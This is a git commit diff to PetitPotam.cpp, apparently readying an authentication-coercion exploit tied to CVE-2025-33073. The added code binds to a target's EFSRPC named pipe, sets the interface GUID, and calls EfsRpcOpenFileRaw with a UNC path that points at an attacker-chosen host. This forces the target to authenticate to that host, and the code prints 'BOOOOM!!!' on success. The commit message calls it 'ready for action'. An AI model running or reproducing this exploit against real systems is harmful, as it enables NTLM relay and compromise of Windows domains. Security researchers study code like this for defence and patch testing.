17b344fbbaa0fea57265020fd7ef81957b198c8c
ChinRayTan <167780333+ChinRayTan@users.noreply.github.com>
2025-07-05 02:01:39 +0800

    CVE-2025-33073 PetitPotam ready for action

--- PetitPotam/PetitPotam.cpp
+++ PetitPotam/PetitPotam.cpp
@@ -15,11 +15,13 @@ int wmain(int argc, wchar_t* argv[])
         RPC_WSTR StringBinding;
         RPC_BINDING_HANDLE Binding;
 
-        wchar_t buffer[100];
-        swprintf(buffer, 100, L"\\\\%s", argv[2]);
+        wchar_t buffer[260];
+        swprintf(buffer, 260, L"\\\\%s", argv[2]);
+
+        wprintf(L"[-] Connecting to %s...\r\n", argv[2]);
 
         status = RpcStringBindingCompose(
-            (RPC_WSTR)L"",  // Interface's GUID, will be handled by NdrClientCall
+            (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d",  // Interface's GUID, will be handled by NdrClientCall
             (RPC_WSTR)L"ncacn_np",      // Protocol sequence
             (RPC_WSTR)buffer, // Network address
             (RPC_WSTR)L"\\pipe\\efsrpc", // Endpoint
@@ -27,44 +29,73 @@ int wmain(int argc, wchar_t* argv[])
             &StringBinding              // Output string binding
         );
 
-        wprintf(L"[*] RpcStringBindingCompose status code: %d\r\n", status);
+        if (status != RPC_S_OK) {
+            wprintf(L"[!] RpcStringBindingCompose status code: %d\r\n", status);
+            return 1;
+        }
 
-        wprintf(L"[*] String binding: %ws\r\n", StringBinding);
+        wprintf(L"[-] Binding to %ws...\r\n", StringBinding);
 
         status = RpcBindingFromStringBinding(
             StringBinding,              // Previously created string binding
             &Binding                    // Output binding handle
         );
 
-        wprintf(L"[*] RpcBindingFromStringBinding status code: %d\r\n", status);
+        if (status != RPC_S_OK) {
+            wprintf(L"[!] RpcBindingFromStringBinding status code: %d\r\n", status);
+            return 1;
+        }
+
+        wprintf(L"[+] Successfully bound to pipe.\r\n");
 
         status = RpcStringFree(
             &StringBinding              // Previously created string binding
         );
 
-        wprintf(L"[*] RpcStringFree status code: %d\r\n", status);
+        if (status != RPC_S_OK) {
+            wprintf(L"[!] RpcStringFree status code: %d\r\n", status);
+            return 1;
+        }
 
-        status = RpcBindingSetAuthInfo(Binding, (RPC_WSTR)argv[2], RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_AUTHZ_NONE);
+        wprintf(L"[-] Authenticating as currently logged in user via SSPI...\r\n");
 
-        wprintf(L"[*] RpcBindingSetAuthInfo status code: %d\r\n", status);
+        status = RpcBindingSetAuthInfo(Binding, (RPC_WSTR)buffer, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_AUTHZ_NONE);
 
-        long result;
+        if (status != RPC_S_OK) {
+            wprintf(L"[!] RpcBindingSetAuthInfo status code: %d\r\n", status);
+            return 1;
+        }
 
         RpcTryExcept
         {
+            HRESULT result;
+            PVOID pContext;
+            wchar_t pwszFilePath[260];
+            swprintf(pwszFilePath, 260, L"\\\\%s\\test\\Settings.ini\x00", argv[1]);
 
-            wchar_t pwszFilePath[100];
-            swprintf(pwszFilePath, 100, L"\\\\%s\\test\\Settings.ini\x00", argv[1]);
+            wprintf(L"[-] Invoking EfsRpcOpenFileRaw with target path: %ws\r\n", pwszFilePath);
 
-            wprintf(L"[*] Invoking EfsRpcEncryptFileSrv with target path: %ws\r\n", pwszFilePath);
-            result = EfsRpcEncryptFileSrv(Binding, pwszFilePath);
-            wprintf(L"[*] EfsRpcEncryptFileSrv status code: %d\r\n", result);
+            result = EfsRpcOpenFileRaw(Binding, &pContext, pwszFilePath, 0);
+
+            if (result == ERROR_BAD_NETPATH) {
+                wprintf(L"[+] Got expected ERROR_BAD_NETPATH exception!!\r\n");
+                wprintf(L"[+] BOOOOM!!!\r\n");
+            }
+            else if (result == ERROR_ACCESS_DENIED) {
+                wprintf(L"[!] Got ERROR_ACCESS_DENIED! Make sure you are able to log in with the current user's credentials on the target server.\r\n");
+                return 1;
+            } else if (result == ERROR_INVALID_HANDLE) {
+                wprintf(L"[!] Got ERROR_INVALID_HANDLE! On Windows Server 2025 and Windows 11, make sure the EFS service is running.\r\n");
+            } else {
+                wprintf(L"[!] EfsRpcOpenFileRaw status code: %d\r\n", result);
+                return 1;
+            }
 
             LocalFree(pwszFilePath);
         }
         RpcExcept(EXCEPTION_EXECUTE_HANDLER);
         {
-            wprintf(L"[X] Exception: %d - 0x%08x\r\n", RpcExceptionCode(), RpcExceptionCode());
+            wprintf(L"[!] Exception: %d - 0x%08x\r\n", RpcExceptionCode(), RpcExceptionCode());
         }
         RpcEndExcept
 
@@ -72,7 +103,7 @@ int wmain(int argc, wchar_t* argv[])
                 &Binding                    // Reference to the opened binding handle
             );
 
-        wprintf(L"[*] RpcBindingFree status code: %d\r\n", status);
+        wprintf(L"[-] RpcBindingFree status code: %d\r\n", status);
     }
 }
 
